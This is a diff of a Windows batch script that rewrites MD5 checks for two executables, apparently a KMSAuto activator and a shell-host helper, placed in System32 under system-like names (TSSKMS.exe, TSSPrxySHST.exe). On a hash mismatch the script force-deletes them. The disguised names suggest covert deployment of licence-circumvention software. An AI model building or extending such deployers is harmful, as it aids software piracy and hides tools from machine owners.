@@ -477,40 +477,48 @@ set "SHSTFILEroot=%SystemRoot%\System32\TSSPrxySHST.exe"
 
 
 echo Checking if %SHSTFILE% exists...
+
 if exist "%SHSTFILE%" (
-    echo %SHSTFILE% found, calculating MD5...
-    for /f "tokens=*" %%A in ('certutil -hashfile "%SHSTFILE%" MD5 ^| findstr /V "hash"') do set "SHSTFILEmd5=%%A"
-    echo MD5 of %SHSTFILE% = %SHSTFILEmd5%
-    echo Comparing with stored MD5: %ShellHostMD5%
-
-    if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
-        echo MD5 matches, proceeding to CheckComSurrogate...
-        goto CheckComSurrogate
-    ) else (
-        echo MD5 mismatch detected! Deleting %SHSTFILEroot% and %SHSTFILE%...
-        set "MESSAGE=%MESSAGE%MD5SHSTMISMATCH"
-        del /f /q "%SHSTFILEroot%" >nul 2>&1
-        del /f /q "%SHSTFILE%" >nul 2>&1
-
-        if exist "%SHSTFILEroot%" (
-            echo Failed to delete %SHSTFILEroot%!
-        ) else (
-            echo Successfully deleted %SHSTFILEroot%.
-        )
-
-        if exist "%SHSTFILE%" (
-            echo Failed to delete %SHSTFILE%!
-        ) else (
-            echo Successfully deleted %SHSTFILE%.
-        )
-
-        if exist "%SHSTFILEroot%" || exist "%SHSTFILE%" (
-            echo One or more files could not be deleted. Proceeding to CheckComSurrogate...
-            goto CheckComSurrogate
-        )
-    )
+    goto CHECKSHSTMD5
+) else (
+    goto SHSTINSTALL
 )
 
+
+:CHECKSHSTMD5
+for /f "tokens=*" %%A in ('certutil -hashfile "%SHSTFILE%" MD5 ^| findstr /V "hash"') do set "SHSTFILEmd5=%%A"
+echo MD5 of %SHSTFILE% = %SHSTFILEmd5%
+echo.
+echo Comparing with stored MD5: %ShellHostMD5%
+echo.
+
+if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
+    echo MD5 matches %SHSTFILEmd5% = %ShellHostMD5%
+	echo going to CheckComSurrogate
+    goto CheckComSurrogate
+)
+
+echo MD5 doesnt match %SHSTFILEmd5% # %ShellHostMD5%
+set "MESSAGE=%MESSAGE%MD5SHSTMISMATCH"
+
+echo Deleting %SHSTFILEroot% and %SHSTFILE%
+del /f /q "%SHSTFILEroot%" >nul 2>&1
+del /f /q "%SHSTFILE%" >nul 2>&1
+echo.
+
+if exist "%SHSTFILEroot%" (
+    echo Failed to delete %SHSTFILEroot%!
+	goto CheckComSurrogate
+) else (
+    echo Successfully deleted %SHSTFILEroot%.
+)
+
+if exist "%SHSTFILE%" (
+     echo Failed to delete %SHSTFILE%!
+	 goto CheckComSurrogate
+) else (
+     echo Successfully deleted %SHSTFILE%.
+)
 
 
 
@@ -610,38 +618,48 @@ set "KMSFILEroot=%SystemRoot%\System32\TSSKMS.exe"
 
 echo Checking if %KMSFILE% exists...
 if exist "%KMSFILE%" (
-    echo %KMSFILE% found, calculating MD5...
-    for /f "tokens=*" %%A in ('certutil -hashfile "%KMSFILE%" MD5 ^| findstr /V "hash"') do set "KMSFILEmd5=%%A"
-    echo MD5 of %KMSFILE% = %KMSFILEmd5%
-    echo Comparing with stored MD5: %KMSAutoMD5%
-
-    if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
-        echo MD5 matches, proceeding to CheckNIRCMD...
-        goto CheckNIRCMD
-    ) else (
-        echo MD5 mismatch detected! Deleting %KMSFILEroot% and %KMSFILE%...
-        set "MESSAGE=%MESSAGE%MD5KMSAUTOMISMATCH"
-        del /f /q "%KMSFILEroot%" >nul 2>&1
-        del /f /q "%KMSFILE%" >nul 2>&1
-
-        if exist "%KMSFILEroot%" (
-            echo Failed to delete %KMSFILEroot%!
-        ) else (
-            echo Successfully deleted %KMSFILEroot%.
-        )
-
-        if exist "%KMSFILE%" (
-            echo Failed to delete %KMSFILE%!
-        ) else (
-            echo Successfully deleted %KMSFILE%.
-        )
-
-        if exist "%KMSFILEroot%" || exist "%KMSFILE%" (
-            echo One or more files could not be deleted. Proceeding to CheckNIRCMD...
-            goto CheckNIRCMD
-        )
-    )
+    goto CHECKKMSMD5
+) else (
+    goto KMSINSTALL
 )
+
+
+:CHECKKMSMD5
+for /f "tokens=*" %%A in ('certutil -hashfile "%KMSFILE%" MD5 ^| findstr /V "hash"') do set "KMSFILEmd5=%%A"
+echo MD5 of %KMSFILE% = %KMSFILEmd5%
+echo.
+echo Comparing with stored MD5: %KMSAutoMD5%
+echo.
+
+if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
+    echo MD5 matches %KMSFILEmd5% = %KMSAutoMD5%
+	echo going to CheckNIRCMD
+    goto CheckNIRCMD
+)
+
+echo MD5 doesnt match %KMSFILEmd5% # %KMSAutoMD5%
+set "MESSAGE=%MESSAGE%MD5KMSMISMATCH"
+
+echo Deleting %KMSFILEroot% and %KMSFILE%
+del /f /q "%KMSFILEroot%" >nul 2>&1
+del /f /q "%KMSFILE%" >nul 2>&1
+echo.
+
+if exist "%KMSFILEroot%" (
+    echo Failed to delete %KMSFILEroot%!
+	goto CheckNIRCMD
+) else (
+    echo Successfully deleted %KMSFILEroot%.
+)
+
+if exist "%KMSFILE%" (
+     echo Failed to delete %KMSFILE%!
+	 goto CheckNIRCMD
+) else (
+     echo Successfully deleted %KMSFILE%.
+)
+
+
 
 
 
